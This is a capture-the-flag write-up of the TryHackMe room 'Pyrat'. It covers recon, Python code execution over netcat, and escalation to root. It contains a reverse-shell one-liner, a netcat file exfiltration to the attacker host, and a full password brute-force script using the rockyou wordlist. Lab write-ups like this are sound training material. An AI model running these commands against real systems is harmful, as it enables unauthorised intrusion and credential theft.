### Flags

1. What is the user flag?
2. What is the root flag?

## Initial Recon

We are provided with a little bit of help. Let's break it down into individual steps of what needs to be done.

> Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.
{: .prompt-tip}

1. Remote code execution through a malicious payload to gain foothold
2. Look for well-known folders with credentials in them (maybe `.ssh`?)
3. Look for possible `.git` folders that reveals older commits
4. Find a special endpoint and fuzz for passwords
5. Use password to get root

Now, let's start with an Nmap scan.
```console
m3ga@kali:~$ nmap -sS -Pn -v -p- -T4 -A -oN portscan.nmap 10.10.102.144
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods:

|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
```

Navigating to `http://10.10.102.144:8000` we get a message saying:

> Try a more basic connection! 

![](<Pasted image 20241005182726.png>){: w="400" h="300" .center }

## Flag 1 and Flag 2

> What is the user flag?
>
> What is the root flag?

I tried connecting to this port using `netcat`.

```console
m3ga@kali:~$ nc 10.10.102.144 8000
whoami
name 'whoami' is not defined
```

The error message immediately let me know that we can run our own python code. Let's exploit this and get a reverse shell.

```console
m3ga@kali:~$ nc 10.10.102.144 8000
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.75.248 53 >/tmp/f")
```

It works!

```console
m3ga@kali:~/Pyrat$ nc -lvnp 53
listening on [any] 53 ...
connect to [10.11.75.248] from (UNKNOWN) [10.10.102.144] 51086
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

After some enumeration I found an email from `root` to a user called `think`

```console
www-data@Pyrat:/tmp$ cat /var/mail/think 
From root@pyrat  Thu Jun 15 09:08:55 2023

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```

This didn't really help at first but it will come into play later.

After this, I found a folder inside `/opt` called `dev`. There was nothing inside other than a `.git` directory. I compressed the directory and downloaded it to my machine.

```console
www-data@Pyrat:/opt$ tar -cvf "/tmp/dev.tar" ./dev/ 
./dev/
./dev/.git/
...
www-data@Pyrat:/tmp$ nc 10.11.75.248 443 < /tmp/dev.tar



m3ga@kali:~$ nc -lvnp 443 > dev.tar
listening on [any] 443 ...
connect to [10.11.75.248] from (UNKNOWN) [10.10.102.144] 37796
^C
m3ga@kali:~$ tar -xvf dev.tar 
./dev/
./dev/.git/
...
```

Looking for usernames within the git's config, I found `josemlwdf@github.com`.

```console
m3ga@kali:~/Dev$ git config --get user.email 
josemlwdf@github.com
```

At this point, I went to github and looked for a user called `josemlwdf` and I found them.
One of their [repositories](https://github.com/josemlwdf/PyRAT/tree/main) is called `pyRAT`.

![](<Pasted image 20241005220925.png>){: w="700" h="300" .center }

Since there was a mention of a "RAT" in the email we found, I was sure that this is the way to go. Going through the repository, I found the source code of the server side script that was running.

> I couldn't find a way to escalate my privileges to the user `think`. At this point I will try to get `root` access and not worry about user. I found a password in one of the older commits but I couldn't use it anywhere. (commit `ae73333`)
{: .prompt-warning}

### Code Review

This part of the code is the most interesting. Let's break it down and understand what's happening.
```python
def switch_case(client_socket, data):
    if data == 'admin':
        get_admin(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0) and (str(client_socket) not in admins):
            change_uid()
        if data == 'shell':
            shell(client_socket)
            remove_socket(client_socket)
        else:
            exec_python(client_socket, data)
```

This part checks if the data received form the user is `admin`. if so, it will call a function called `get_admin()`
```python
if data == 'admin':
        get_admin(client_socket)
```

If there was no `admin` provided in the user's input, it will check for the `UID` that the script is running under. If it's running under root and the user is not authenticated, it will set it to `UID 33` or `www-data` in the `change_uid()` function.

```python
else:
    # Check socket is admin and downgrade if is not aprooved
    uid = os.getuid()
    if (uid == 0) and (str(client_socket) not in admins):
        change_uid()
```

And now, if the user provides `shell` as the input, it will give the user shell access as `www-data`. Otherwise, it will just try to run the user's input as python code.

```python
if data == 'shell':
    shell(client_socket)
    remove_socket(client_socket)
else:
    exec_python(client_socket, data)
```

The `get_admin()` function is the next interesting part. Let's break this down too.
```python
# Handles the Admin endpoint
def get_admin(client_socket):
    global admins

    uid = os.getuid()
    if (uid != 0):
        send_data(client_socket, "Start a fresh client to begin.")
        return

    password = 'testpass'

    for i in range(0, 3):
        # Ask for Password
        send_data(client_socket, "Password:")

        # Receive data from the client
        try:
            data = client_socket.recv(1024).decode("utf-8")
        except Exception as e:
            # Send the exception message back to the client
            send_data(client_socket, e)
            pass
        finally:
            # Reset stdout to the default
            sys.stdout = sys.__stdout__

        if data.strip() == password:
            admins.append(str(client_socket))
            send_data(client_socket, 'Welcome Admin!!! Type "shell" to begin')
            break
```

The global variable `admins` is used to add the authenticated connections. The script checks if the `UID` is already 0. If so, it will ask the user to start a new connection.
```python
global admins

    uid = os.getuid()
    if (uid != 0):
        send_data(client_socket, "Start a fresh client to begin.")
        return
```

The variable `password` contains the admin's password. However, this is not the actual password (We will have to brute-force it later).  The script then prompts the user for a password and the user has 3 tries to get the password right.
```python
password = 'testpass'

for i in range(0, 3):
	# Ask for Password
    send_data(client_socket, "Password:")

    # Receive data from the client
    try:
	    data = client_socket.recv(1024).decode("utf-8")
    except Exception as e:
	    # Send the exception message back to the client
	    send_data(client_socket, e)
		pass
	finally:
		# Reset stdout to the default
		sys.stdout = sys.__stdout__
```

If the password provided by the user is correct, the connection is added to the admin's list. The user is then able to send `shell` as the data and get a shell as `root`.
```python
if data.strip() == password:
	admins.append(str(client_socket))
	send_data(client_socket, 'Welcome Admin!!! Type "shell" to begin')
	break
```

### Access

To brute force the password, I wrote a simply python script.

```python
import socket
import time

def brute_force_password():
    # Define server address and port
    server_address = '10.10.102.144'  # Replace with the server IP
    server_port = 8000

    # Load the password list
    with open("/usr/share/wordlists/rockyou.txt", 'r', encoding='latin-1') as f:
        password_list = f.readlines()

    for password in password_list:
        password = password.strip()  # Strip any newline or space characters

        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(5)  # Set a timeout of 5 seconds for socket operations

        try:
            # Connect to the server
            client_socket.connect((server_address, server_port))

            # Step 1: Send 'admin' to initiate admin login
            data = 'admin'
            client_socket.sendall(data.encode('utf-8'))

            # Step 2: Wait for "Password:" prompt from server
            response = client_socket.recv(1024).decode('utf-8').strip()
            if "Password" not in response:
                print(f"Unexpected response: {response}")
                client_socket.close()
                continue

            # Step 3: Send the password attempt
            client_socket.sendall(password.encode('utf-8'))

            # Step 4: Receive response from the server
            response = client_socket.recv(1024).decode('utf-8').strip()
            if "Welcome Admin" in response:
                print(f"\n[+] Password found: {password}")
                break
            elif "Password" in response:
                # If prompted again for the password, it means the attempt failed
                print(f"[-] Password incorrect: {password}")
            	pass
            else:
                # Unexpected response
                print(f"Unexpected response: {response}")

        except socket.timeout:
            print(f"Connection timed out while trying password: {password}")

        except Exception as e:
            print(f"Error: {e}")

        finally:
            # Close the socket for each iteration
            client_socket.close()
            time.sleep(0.5)  # Small delay to prevent server-side rate limiting

if __name__ == "__main__":
	print("[i] Please wait...")
    brute_force_password()
```

After a couple of tries, the password is found. We can now use it to get a root shell.
```console
m3ga@kali:~$ python3 rat_poison.py
[i] Starting bruteforce...
[-] Password incorrect: 123456
[-] Password incorrect: 12345
...

[+] Password found: [REDACTED]
```

The flags can be found inside `root`'s and `think`'s home directories.
```console
m3ga@kali:~$ nc 10.10.102.144 8000
admin
Password:
[REDACTED]
Welcome Admin!!! Type "shell" to begin
shell
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
[REDACTED]
# cat /home/think/user.txt
[REDACTED]
```

## Outro
Many thanks to the creator of this room, [josemlwdf](https://tryhackme.com/p/josemlwdf).

This was a great room for beginners. I'm disappointed that I didn't get user access first but it's whatever :)

It would have been nice if the old password I found in the repository would have been the `think` user's password since it matched the username somewhat. The `/opt/dev` folder could've been made to be only accessible to `think` so that it was a nice `foothold --> user --> root` type of CTF.

Anyway, it was fun.

### Update
Looking at [jaxafed's writeup](https://jaxafed.github.io/posts/tryhackme-pyrat/), I found the intended way. Apperantly, the `think` user's password can be found inside the git's config file.

```console
www-data@Pyrat:~$ cat /opt/dev/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = [REDACTED]
```

This makes sense now. :)
